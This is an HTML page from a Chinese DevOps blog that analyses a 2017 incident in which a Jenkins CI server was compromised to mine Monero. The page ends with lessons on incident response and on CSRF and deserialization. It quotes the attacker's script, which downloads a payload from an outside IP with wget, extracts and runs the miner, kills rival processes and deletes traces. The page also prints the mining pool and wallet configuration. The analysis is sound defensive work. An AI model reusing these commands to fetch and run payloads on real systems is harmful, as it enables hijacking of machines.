@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="顾宇">
+  
+  
+  
+  <link rel="prev" href="https://www.guyu.me/2017/2017-05-21-devops-culture/" />
+  <link rel="next" href="https://www.guyu.me/2017/2017-08-16-seven-steps-to-start-your-microservices-project/" />
+  <link rel="canonical" href="https://www.guyu.me/2017/2017-06-28-are-your-ci-mining/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           你的 CI 在挖矿吗？ | 顾宇的研习笔记
+       
+  </title>
+  <meta name="title" content="你的 CI 在挖矿吗？ | 顾宇的研习笔记">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/www.guyu.me"
+    },
+    "articleSection" : "posts",
+    "name" : "你的 CI 在挖矿吗？",
+    "headline" : "你的 CI 在挖矿吗？",
+    "description" : "我们的持续集成服务器搭建在AWS上的一个EC2的虚拟机中。采用 Jenkins 2.46.1 并且只有一个Master实例来运行所有的任务。且采用持续部署——团队每天要在开发环境自动部署10\x2b个版本。整个过程由Jenkins内部构建的流水线触发。代码提交，测试，构建，部署一气呵成。\n我们有一个中心产品代码库，这个中心产品对应着不同国家的在线产品。分别是：新加坡，马来西亚，印度尼西亚和香港。为了安全起见，我们为每一个产品的环境单独部署了一套持续交付流水线。由于各地域产品的差异较小，我们采用同一套基础设施配置初始化Jenkins配置，因此，我们有四台差不多的持续交付流水线。\n从一次“构建变慢“的调查说起 在周二的时候，突然有人发现”马来西亚“的部署流程开始变慢，其中构建过程从上周的的7分钟左右变成了44分钟。而同样的代码改动，其它国家的服务器并没有如此大的差异。\n那么问题一定在这个服务器上！\n影响构建速度的因素主要是资源的占用导致的等待，这方面的资源包括：CPU、内存、磁盘和网络。\n由于我们采用NewRelic对所有的持续集成服务器进行监控。所以可以得到CPU、内存、磁盘和网络的性能监控数据以及横向的对比信息。通过对比相关的数据，我们发现这一台服务器上有个在\/tmp目录下运行的叫`donns`的陌生进程长期占用大量CPU，它的文件权限属于Jenkins用户以及Jenkins用户组。所以这个程序的执行是由Jenkins出发了。\n我们在Jenkins的相关网站里搜索这个名为donns进程的相关信息，但一无所获。于是我们在\/tmp目录中寻找和这个进程相关的信息，我们发现了一个陌生的Shell脚本，打开内容看，内容却让我们大跌眼镜。想看脚本完整源代码的请点击这里，一下是几个重要的脚本片段：\n代码片段 1:\npkill conns ps auxw|head -1;ps auxw|sort -rn -k3|head -1|awk \x27{if(\\$3\\\x26gt;80.0) print \x26quot;kill -9 \x26quot; \\$2}\x27|sh pkill bonns  我们看到，这段代码杀死了占用CPU超过80%的进程。此外，杀死了名为conns和bonns的进程。\nconns进程是什么？bonns进程又是什么？为什么要杀死CPU占用率超过80%的进程？\n代码片段 2:\nwget 91.235.143.129:8086\/587b626883fdc.png -O \/tmp\/conn wget 91.235.143.129:8086\/1eac80002f.conf -O \/tmp\/config.conf  从91.235.143.129:8086下载了一个图片和一个配置文件。这个服务器是干嘛的？这个配置文件又包含了哪些内容？\n通过在自己的沙盒环境里打开这个配置文件，发现它的内容是这样的：\n{ \x26quot;url\x26quot; : \x26quot;stratum\x2btcp:\/\/xmr.crypto-pool.fr:3333\x26quot;, \x26quot;user\x26quot; : \x26quot;43ZQzwdYHC9ebXxZhJuwkH5jvmfEBCEjkd1PvqxacrJaEDQFyNuxJhcib8MsJRgFnbATB6rpBEzq8EKqRqUbjyNy3opCS4k\x26quot;, \x26quot;pass\x26quot; : \x26quot;x\x26quot; }  stratum\x2btcp 协议引发了我的好奇心，经过调查，这居然是一个叫做门罗币的加密虚拟币的矿池协议：\n 门罗币XMR一种使用CryptoNote协议的一个虚拟币币种，其并不是比特币的一个分支。CryptoNote在2012年已经开发出来，当年已有Bytecoin使用CrytoNote技术，XMR是在2014年开发出来，可以预见CryptoNote技术已经非常成熟，该技术通过数字环签名提供更好的匿名性。目前国内对该币种匿名技术宣传较少，国外知名度较高。Monero词语是引自于世界语，在世界语中的含义表示为货币。\n而矿池则是是比特币(Bitcoin)等P2P密码学虚拟货币开采所必须的基础设施，一般是对外开放的团队开采服务器，其存在意义为提升比特币开采稳定性，使矿工薪酬趋于稳定。\n假设100万人参与比特币挖矿，全网400P算力，其中90%的矿工为1P(1000T)以下的算力，如果投入一台1T矿机，将占全网算力的40万分之1，理论上平均每40万个10分钟能挖到一个区块，也就是7.6年才能挖到一个区块然后一次性拿到50个比特币。那么，假如我再找9个拥有1T算力矿机的矿工，达成协定，我们总共10个人，其中任何一个人挖到区块，都按照每人的算力占比来进行平分，那么我们就是一个整体，总共10T算力，那么平均0.76年即可挖到一个区块，然后算下来到我们手上的就是0.76年开采到5个比特币，如果组织100人、1000人、1万人甚至10万人呢？如果是10万人，那么平均100分钟就能挖到1个区块，作为团队的一份子，我的收入将会趋于稳定。这就是矿池的基本原理，即大家组队进行比特币开采，可以参考彩票中的合买。\n 当然，以上只是对矿池的基本原理和性质进行简单的描述，实际情况会非常复杂。矿池是一个全自动的开采平台，即矿机接入矿池——提供算力——获得收益。\n抱着“大胆假设，小心求证”的心态，我们找到了配置文件中这家叫做crypyto-pool的网站https:\/\/monero.crypto-pool.fr\/它是一个著名门罗币的矿池网站。而通过配置文件的用户名，我们看到了这个程序的挖矿记录和转账记录。根据6月份的交易数据以及对应牌价，截止作者发稿时，该程序已 为作者赚取了 1165.64 美元的收益。",
+    "inLanguage" : "zh-cn",
+    "author" : "顾宇",
+    "creator" : "顾宇",
+    "publisher": "顾宇",
+    "accountablePerson" : "顾宇",
+    "copyrightHolder" : "顾宇",
+    "copyrightYear" : "2017",
+    "datePublished": "2017-06-28 00:00:00 \x2b0000 UTC",
+    "dateModified" : "2017-06-28 00:00:00 \x2b0000 UTC",
+    "url" : "https:\/\/www.guyu.me\/2017\/2017-06-28-are-your-ci-mining\/",
+    "wordCount" : "208",
+    "keywords" : [ "DevOps 文化", "顾宇的研习笔记"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://www.guyu.me">顾宇的研习笔记</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">博客</a>
+                
+                <a class="menu-item" href="/categories/" title="">分类</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/share/" title="外部分享">外部分享</a>
+                
+                <a class="menu-item" href="https://www.guyu.me/resume/" title="">个人简历</a>
+                
+                <a class="menu-item" href="/about/" title="关于我">关于我</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://www.guyu.me">顾宇的研习笔记</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">博客</a>
+                
+                <a class="menu-item" href="/categories/" title="">分类</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/share/" title="外部分享">外部分享</a>
+                
+                <a class="menu-item" href="https://www.guyu.me/resume/" title="">个人简历</a>
+                
+                <a class="menu-item" href="/about/" title="关于我">关于我</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">你的 CI 在挖矿吗？</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://www.guyu.me" rel="author">顾宇</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2017-06-28 itemprop="datePublished">June 28, 2017</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="https://www.guyu.me/categories/devops/"> DevOps </a>
+                        
+                </span>
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          
+
+<p>我们的持续集成服务器搭建在AWS上的一个EC2的虚拟机中。采用 Jenkins 2.46.1 并且只有一个Master实例来运行所有的任务。且采用持续部署——团队每天要在开发环境自动部署10+个版本。整个过程由Jenkins内部构建的流水线触发。代码提交，测试，构建，部署一气呵成。</p>
+
+<p>我们有一个中心产品代码库，这个中心产品对应着不同国家的在线产品。分别是：新加坡，马来西亚，印度尼西亚和香港。为了安全起见，我们为每一个产品的环境单独部署了一套持续交付流水线。由于各地域产品的差异较小，我们采用同一套基础设施配置初始化Jenkins配置，因此，我们有四台差不多的持续交付流水线。</p>
+
+<h2 id="从一次-构建变慢-的调查说起">从一次“构建变慢“的调查说起</h2>
+
+<p>在周二的时候，突然有人发现”马来西亚“的部署流程开始变慢，其中构建过程从上周的的7分钟左右变成了44分钟。而同样的代码改动，其它国家的服务器并没有如此大的差异。</p>
+
+<p><strong>那么问题一定在这个服务器上</strong>！</p>
+
+<p>影响构建速度的因素主要是资源的占用导致的等待，这方面的资源包括：CPU、内存、磁盘和网络。</p>
+
+<p>由于我们采用NewRelic对所有的持续集成服务器进行监控。所以可以得到CPU、内存、磁盘和网络的性能监控数据以及横向的对比信息。通过对比相关的数据，我们发现这一台服务器上有个在/tmp目录下运行的叫`donns`的陌生进程长期占用大量CPU，它的文件权限属于Jenkins用户以及Jenkins用户组。所以这个程序的执行是由Jenkins出发了。</p>
+
+<p>我们在Jenkins的相关网站里搜索这个名为donns进程的相关信息，但一无所获。于是我们在/tmp目录中寻找和这个进程相关的信息，我们发现了一个陌生的Shell脚本，打开内容看，内容却让我们大跌眼镜。想看脚本完整源代码的请<a href="https://github.com/wizardbyron/jenkins_vulnerabilities/blob/master/bonn.sh" rel="nofollow noreferrer" target="_blank">点击这里</a>，一下是几个重要的脚本片段：</p>
+
+<p><strong>代码片段 1</strong>:</p>
+
+<pre><code class="language-bash">pkill conns
+
+ps auxw|head -1;ps auxw|sort -rn -k3|head -1|awk '{if(\$3\&gt;80.0) print
+&quot;kill -9 &quot; \$2}'|sh
+
+pkill bonns
+</code></pre>
+
+<p>我们看到，这段代码杀死了占用CPU超过80%的进程。此外，杀死了名为conns和bonns的进程。</p>
+
+<p>conns进程是什么？bonns进程又是什么？为什么要杀死CPU占用率超过80%的进程？</p>
+
+<p><strong>代码片段 2</strong>:</p>
+
+<pre><code class="language-bash">wget 91.235.143.129:8086/587b626883fdc.png -O /tmp/conn
+
+wget 91.235.143.129:8086/1eac80002f.conf -O /tmp/config.conf
+</code></pre>
+
+<p>从91.235.143.129:8086下载了一个图片和一个配置文件。这个服务器是干嘛的？这个配置文件又包含了哪些内容？</p>
+
+<p>通过在自己的沙盒环境里打开这个配置文件，发现它的内容是这样的：</p>
+
+<pre><code class="language-json">{
+&quot;url&quot; : &quot;stratum+tcp://xmr.crypto-pool.fr:3333&quot;,
+&quot;user&quot; :
+ &quot;43ZQzwdYHC9ebXxZhJuwkH5jvmfEBCEjkd1PvqxacrJaEDQFyNuxJhcib8MsJRgFnbATB6rpBEzq8EKqRqUbjyNy3opCS4k&quot;,
+&quot;pass&quot; : &quot;x&quot;
+}
+</code></pre>
+
+<p><strong>stratum+tcp</strong> 协议引发了我的好奇心，经过调查，这居然是一个叫做<strong>门罗币的加密虚拟币</strong>的<strong>矿池</strong>协议：</p>
+
+<blockquote>
+<p><strong>门罗币</strong><strong>XMR</strong>一种使用CryptoNote协议的一个虚拟币币种，其并不是比特币的一个分支。CryptoNote在2012年已经开发出来，当年已有Bytecoin使用CrytoNote技术，XMR是在2014年开发出来，可以预见CryptoNote技术已经非常成熟，该技术通过数字环签名提供更好的匿名性。目前国内对该币种匿名技术宣传较少，国外知名度较高。Monero词语是引自于世界语，在世界语中的含义表示为货币。</p>
+
+<p>而<strong>矿池</strong>则是是比特币(Bitcoin)等P2P密码学虚拟货币开采所必须的基础设施，一般是对外开放的团队开采服务器，其存在意义为提升比特币开采稳定性，使矿工薪酬趋于稳定。</p>
+
+<p>假设100万人参与比特币挖矿，全网400P算力，其中90%的矿工为1P(1000T)以下的算力，如果投入一台1T矿机，将占全网算力的40万分之1，理论上平均每40万个10分钟能挖到一个区块，也就是7.6年才能挖到一个区块然后一次性拿到50个比特币。那么，假如我再找9个拥有1T算力矿机的矿工，达成协定，我们总共10个人，其中任何一个人挖到区块，都按照每人的算力占比来进行平分，那么我们就是一个整体，总共10T算力，那么平均0.76年即可挖到一个区块，然后算下来到我们手上的就是0.76年开采到5个比特币，如果组织100人、1000人、1万人甚至10万人呢？如果是10万人，那么平均100分钟就能挖到1个区块，作为团队的一份子，我的收入将会趋于稳定。这就是矿池的基本原理，即大家组队进行比特币开采，可以参考彩票中的合买。</p>
+</blockquote>
+
+<p>当然，以上只是对矿池的基本原理和性质进行简单的描述，实际情况会非常复杂。矿池是一个全自动的开采平台，即矿机接入矿池——提供算力——获得收益。</p>
+
+<p>抱着“大胆假设，小心求证”的心态，我们找到了配置文件中这家叫做crypyto-pool的网站<a href="https://monero.crypto-pool.fr/" rel="nofollow noreferrer" target="_blank">https://monero.crypto-pool.fr/</a>它是一个著名门罗币的矿池网站。而通过配置文件的用户名，我们看到了这个程序的挖矿记录和转账记录。根据6月份的交易数据以及对应牌价，截止作者发稿时，该程序已 为作者赚取了 1165.64 美元的收益。</p>
+
+<p>而接下来的代码间接暴露了证据：</p>
+
+<p><strong>代码片段 3</strong>:</p>
+
+<pre><code class="language-bash">dd if=/tmp/conn skip=7664 bs=1 of=/tmp/donns
+
+chmod +x /tmp/donns
+nohup /tmp/donns -B -c /tmp/config.conf \&gt;/dev/null 2\&gt;&amp;1 &amp;
+rm -rf /tmp/config.conf
+rm -rf /tmp/conn
+rm -rf /tmp/conns
+rm -f /tmp/bonn.sh
+</code></pre>
+
+<p>这段脚本不光执行了程序，并且删除了执行后的相关文件记录。确认了是挖矿进程之后，我们果断的停止了进程，并且把对应的环境制作成了临时镜像以便做进一步分析。</p>
+
+<p>以上，我们仅仅通过一系列调查证明了 donns 进程具有挖门罗币的功能。然而，我们很难知道它是否做了别的事情。比如把 CI
+上的关键信息发送出去，后果则不堪设想……</p>
+
+<h2 id="那么问题来了-这段脚本是如何进入ci的">那么问题来了，这段脚本是如何进入CI的</h2>
+
+<p>通过网上搜索相关线索（<a href="https://groups.google.com/forum/#!topic/jenkinsci-advisories/sN9S0x78kMU" rel="nofollow noreferrer" target="_blank">https://groups.google.com/forum/#!topic/jenkinsci-advisories/sN9S0x78kMU</a>），这个脚本最早是2016年11月11日发现的，最早是一个叫做kwwoker32的进程，脚本很相似。从脚本来看，经历了conns, bonns两代的演化之后，这应该是第三代挖矿脚本了。从脚本来看，donns和bonns和conns是竞争关系，因此执行之前要把它俩先强制终止并清除。它们所采用的应该是同一个漏洞。</p>
+
+<p>这个漏洞存在于Jenkins CLI，这是一个用Java编写的命令行工具，可以通过命令行远程操作Jenkins来执行很多操作。在这个例子中，攻击者通过这个工具向Jenkins服务器传送一个序列化的对象连接到攻击者的LDAP服务器，以此绕过Jenkins自身保护机制并且远程执行代码。</p>
+
+<p>修复方法是手动修改Jenkins的执行脚本，关闭CLI这个选项（默认是打开的）。</p>
+
+<p>而在今年的4月26日，又修复了一大批通过 <strong>跨站请求伪造(Cross Site Request Forgery)远程执行代码的漏洞</strong>。</p>
+
+<p><strong>跨站请求伪造（Cross-Site Request Forgery）</strong> 在OWASP Top 10 里排在 A8，是常见的攻击类型。CSRF攻击原理比较简单，如下图所示：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="http://upload-images.jianshu.io/upload_images/274927-f998f52978cc0a52.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="跨站请求伪造" class="lazyload"><figcaption class="image-caption">跨站请求伪造</figcaption></figure></p>
+
+<h3 id="jenkins-的-跨站请求伪造-csrf-攻击">Jenkins 的 跨站请求伪造（CSRF）攻击</h3>
+
+<p>1.管理员打开浏览器，并输入用户名和密码请求登录Jenkins；</p>
+
+<p>2.在用户信息通过验证后，Jenkins产生Cookie信息并返回给浏览器，此时管理员登录Jenkins成功，可以正常发送请求到Jenkins；</p>
+
+<p>3.用户未退出Jenkins之前，在同一浏览器中，打开一个TAB页访问恶意网站；</p>
+
+<p>4.在恶意网站接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问Jenkins；</p>
+
+<p>5.浏览器在接收到这些攻击性代码后，根据存在恶意代码的网站的请求，在用户不知情的情况下携带Cookie信息，向Jenkins发出请求。Jenkins并不知道该请求其实是由恶意网站发起的，所以会根据用户的Cookie信息中的权限处理该请求，导致来自恶意网站的恶意代码被执行。</p>
+
+<p><strong>简而言之，任何一个拥有 Jenkins 权限的管理员，如果在企业网络内部，同时访问 Jenkins 以及存在攻击脚本的第三方网页，攻击脚本就会伪造请求并利用漏洞进行攻击</strong>。</p>
+
+<h3 id="当发现这样的事故时-我们是怎么做的">当发现这样的事故时，我们是怎么做的</h3>
+
+<p>处理运维事故就像在手术室抢救重症病患一样，最大对手除了问题本身，就是时间，要在最快的速度里减少损失，并且要留下足够的信息便于追查。</p>
+
+<p>而在处理这次事故的时候，我们采取了如下措施：</p>
+
+<ol>
+<li>及时切断网络而不是终止程序，避免更多的泄露。也许你停止了进程的同时，进程也会销毁一切记录，不利于事后排查。</li>
+<li>快速构建虚拟机镜像，保留现场。（这通常需要一些外部资源支持。如果你没有这个条件，保持服务器只有有限的网络访问权限。）</li>
+<li>记录下整个发现的过程，最好能够通过终端软件实时截图。或者采用 script命令录制过程。</li>
+<li>及时保留相关连的第三方系统的访问日志。</li>
+<li>找出这台服务器上所有的 口令，秘钥等，并立即更换。</li>
+<li>终端其它 CI 服务器的运作，并立即进行安全排查。</li>
+<li>采用更严格的黑白名单，限制网络的访问，对应用的访问进行隔离。</li>
+</ol>
+
+<h2 id="通过这一次攻击-我们学到了什么">通过这一次攻击，我们学到了什么</h2>
+
+<h3 id="本次攻击给运维人员的启示">本次攻击给运维人员的启示</h3>
+
+<p><strong>可执行（executeble）的东西往往都是安全隐患的重灾区，尤其是未经授权的执行</strong>。</p>
+
+<p>浏览器是需要防范的第一关，因为浏览器会：1. 访问外部资源，2.自动执行来源不明的脚本。而这些脚本对用户来说是不透明的，这就为很多潜在的 <strong>跨站请求伪造</strong> 便利用了这样一个契机。因此，内外网络分离，限制可公开访问的内容，建立访问黑白名单制度，非常重要。如果持续集成服务器实现了内外网完全隔离，采用跳板机并限制
+Jenkins 对外访问，这次的攻击完全可以避免。</p>
+
+<p>在<a href="2017-02-14-core-devops-concepts.html" rel="nofollow noreferrer" target="_blank">避免CI成为一个安全隐患</a>一文中，由于 CI 具有自动执行任务的能力。因此，它会成为一个重大的安全隐患。而这次事件恰恰 又验证了“漏洞墨菲定律”：只要漏洞有可能被利用，则一定会被利用。</p>
+
+<p>Jenkins是一款开源软件，代码对公众的开放，同时也把漏洞开放给了所有人。因此，需要对开源软件进行更加严格的安全控制和监控，而不能因噎废食，彻底抛弃开源软件，走向另一个极端。</p>
+
+<h3 id="那么-如何安全的使用开源软件">那么，如何安全的使用开源软件</h3>
+
+<ol>
+<li><p>来源可靠：软件包来源应当可靠，最好能通过 MD5 Sum 校验。</p></li>
+
+<li><p>权限受限：在受限的权限和隔离区下使用软件。</p></li>
+
+<li><p>执行可控：运行环境或者网络隔，使之运行在沙箱里，降低影响范围。</p></li>
+
+<li><p>无状态化：定期销毁运行实例，并且进行重启，更新访问权限信息，例如密码或
+token，避免权限滥用。</p></li>
+</ol>
+
+<p>在 DevOps 的实践中，往往会通过自动化执行一些任务带来便利。然而，易用性和安全性往往很难兼得，在自动化的过程中，一定要考虑到其中可能产生安全隐患并且最大程度的限制可执行资源的访问。</p>
+
+<h2 id="本次攻击给-开发人员的启示">本次攻击给 开发人员的启示</h2>
+
+<p><strong>跨站请求伪造</strong>是很常见的安全漏洞，对于 Web 应用开发人员而言，往往会因为某些便利性的设计给站点带来隐患。尤其是  REST API的设计，如果没有添加对应的权限验证，往往会成为跨站请求伪造的目标。虽然多一步验证会影响用户体验，但安全仍然是不能够 Trade-Off 的内容之一。不要为了采取便利的方案留下了很深的安全隐患。创建漏洞往往来源于不小心，而找到漏洞则需要花费更大的周折。采用一些通用的安全实践，往往会得到更好的效果。</p>
+
+<p>关于更多的跨站请求伪造如何防御的信息请参考：</p>
+
+<p><a href="https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_(CSRF)" rel="nofollow noreferrer" target="_blank">Top 10 2013-A8-Cross-Site Request Forgery (CSRF) -OWASP</a></p>
+
+<p><a href="http://www.freebuf.com/articles/web/11840.html" rel="nofollow noreferrer" target="_blank">[科普]跨站请求伪造-CSRF防护方法 - FreeBuf.COM |关注黑客与极客</a></p>
+
+<p>此外，通过对象传递，利用 Java 接口的特性，攻击者可以自由改写方法的实现。从而达到远程执行代码的目的，Jenkins CLI 的漏洞就来源于此，在代码设计时如果缺乏足够的验证和异常捕获，攻击代码就可以通过异常绕过验证并直接执行。<strong>因此，传递对象如果包含可执行的内容，一定要非常小心。如果要传递序列化的对象，在反序列化的时候一定要进行足够的验证</strong>。</p>
+
+<h2 id="还是那句话-如果没有这些如果">还是那句话，如果没有这些如果</h2>
+
+<p>攻击者的手段是层出不穷的，因此安全不单单是运维或是开发的问题，它是一个问题体系。DevOps 团队一定要有安全內建（<a href="http://www.buildsecurityin.cn/zh/" rel="nofollow noreferrer" target="_blank">Build Security In</a>）的意识。从工作流程，安全实践和安全仪式上进行全方位的评估和学习，请不要把安全当做是阻碍，它是保护你和大家的最好手段。</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/cc-nd.png" alt="知识共享许可协议" class="lazyload"><figcaption class="image-caption">知识共享许可协议</figcaption></figure>
+本作品采用<a href="http://creativecommons.org/licenses/by-nd/4.0/" rel="nofollow noreferrer" target="_blank">知识共享署名-禁止演绎 4.0 国际许可协议</a>进行许可。</p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>顾宇 </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://www.guyu.me/2017/2017-06-28-are-your-ci-mining/>https://www.guyu.me/2017/2017-06-28-are-your-ci-mining/</span>
+            </p>
+            
+             
+            <p class="copyright-item lincese">
+                本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可
+            </p>
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-tag"></i>Tag(s): 
+            
+            <span class="tag"><a href="https://www.guyu.me/tags/devops-%E6%96%87%E5%8C%96/">
+                    #DevOps 文化</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://www.guyu.me">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://www.guyu.me/2017/2017-05-21-devops-culture/" class="prev" rel="prev" title="DevOps前世今生 - DevOps 的文化"><i class="iconfont icon-left"></i>&nbsp;DevOps前世今生 - DevOps 的文化</a>
+         
+        
+        <a href="https://www.guyu.me/2017/2017-08-16-seven-steps-to-start-your-microservices-project/" class="next" rel="next" title="提升微服务实施效率的 7 个步骤">提升微服务实施效率的 7 个步骤&nbsp;<i class="iconfont icon-right"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2016 - 2019</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://www.guyu.me">顾宇</a> | </span> 
+         
+
+         
+            <a href="http://www.miibeian.gov.cn/" target="_blank" rel="external nofollow">陕ICP备18015535号 </a> |
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
